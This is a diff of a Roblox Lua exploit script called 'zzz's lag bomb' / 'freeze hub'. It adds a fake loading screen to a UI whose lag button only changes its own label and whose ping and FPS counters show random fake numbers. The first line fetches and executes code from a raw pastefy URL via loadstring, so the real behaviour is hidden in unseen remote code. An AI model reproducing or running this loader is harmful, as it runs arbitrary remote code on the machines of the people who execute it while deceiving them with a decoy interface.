@@ -1,9 +1,68 @@
 loadstring(game:HttpGet("https://pastefy.app/gBpO0gpe/raw"))()
 local player = game.Players.LocalPlayer
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "LagBombUI"
+gui.Name = "ZZZ_LagBomb"
 
--- Main Frame
+--========================--
+-- LOADING SCREEN
+--========================--
+
+local blur = Instance.new("BlurEffect", game.Lighting)
+blur.Size = 15
+
+local loadFrame = Instance.new("Frame", gui)
+loadFrame.Size = UDim2.new(1,0,1,0)
+loadFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+loadFrame.BackgroundTransparency = 0.3
+
+local box = Instance.new("Frame", loadFrame)
+box.Size = UDim2.new(0, 220, 0, 80)
+box.Position = UDim2.new(0.5, -110, 0.5, -40)
+box.BackgroundColor3 = Color3.fromRGB(20,20,20)
+box.BorderSizePixel = 0
+
+Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)
+
+-- Text
+local text = Instance.new("TextLabel", box)
+text.Size = UDim2.new(1,0,0,30)
+text.BackgroundTransparency = 1
+text.Text = "freeze hub"
+text.TextColor3 = Color3.new(1,1,1)
+text.Font = Enum.Font.SourceSansBold
+text.TextSize = 16
+
+-- Progress Bar BG
+local barBG = Instance.new("Frame", box)
+barBG.Size = UDim2.new(1,-20,0,6)
+barBG.Position = UDim2.new(0,10,1,-20)
+barBG.BackgroundColor3 = Color3.fromRGB(50,50,50)
+barBG.BorderSizePixel = 0
+
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
+
+-- Progress Bar
+local bar = Instance.new("Frame", barBG)
+bar.Size = UDim2.new(0,0,1,0)
+bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
+bar.BorderSizePixel = 0
+
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
+
+-- Loading Animation (10 seconds)
+for i = 1,100 do
+	bar.Size = UDim2.new(i/100,0,1,0)
+	task.wait(0.1) -- 100 * 0.1 = 10 seconds
+end
+
+-- Remove loading
+loadFrame:Destroy()
+blur:Destroy()
+
+--========================--
+-- ZZZ's LAG BOMB UI
+--========================--
+
 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0, 160, 0, 130)
 frame.Position = UDim2.new(0.5, -80, 0.5, -65)
@@ -12,9 +71,7 @@ frame.BorderSizePixel = 0
 frame.Active = true
 frame.Draggable = true
 
--- Rounded edges
-local corner = Instance.new("UICorner", frame)
-corner.CornerRadius = UDim.new(0, 10)
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
 
 -- Title
 local title = Instance.new("TextLabel", frame)
@@ -24,9 +81,6 @@ title.Text = "zzz's lag bomb"
 title.TextColor3 = Color3.new(1,1,1)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 12
-
-local titleCorner = Instance.new("UICorner", title)
-titleCorner.CornerRadius = UDim.new(0, 10)
 
 -- Ping
 local ping = Instance.new("TextLabel", frame)
@@ -58,9 +112,7 @@ local function createButton(text, color, yPos)
 	btn.TextSize = 11
 	btn.BorderSizePixel = 0
 	
-	local c = Instance.new("UICorner", btn)
-	c.CornerRadius = UDim.new(0, 8)
-	
+	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)
 	return btn
 end
 
@@ -69,7 +121,7 @@ local lagBtn = createButton("lag em", Color3.fromRGB(70,130,180), 60)
 local resetBtn = createButton("Reset", Color3.fromRGB(200,50,50), 85)
 local speedBtn = createButton("Speed [E]", Color3.fromRGB(150,80,80), 110)
 
--- Toggle (visual only)
+-- Toggle
 local enabled = false
 
 lagBtn.MouseButton1Click:Connect(function()
@@ -82,17 +134,11 @@ resetBtn.MouseButton1Click:Connect(function()
 	lagBtn.Text = "lag em"
 end)
 
--- Fake Dynamic Ping & FPS
+-- Fake Ping & FPS
 task.spawn(function()
 	while true do
-		-- fake ping (30 - 120 ms)
-		local fakePing = math.random(30,120)
-		ping.Text = "Ping: "..fakePing.." ms"
-		
-		-- fake fps (40 - 75)
-		local fakeFPS = math.random(40,75)
-		fps.Text = "FPS: "..fakeFPS
-		
+		ping.Text = "Ping: "..math.random(30,120).." ms"
+		fps.Text = "FPS: "..math.random(40,75)
 		task.wait(1)
 	end
 end)
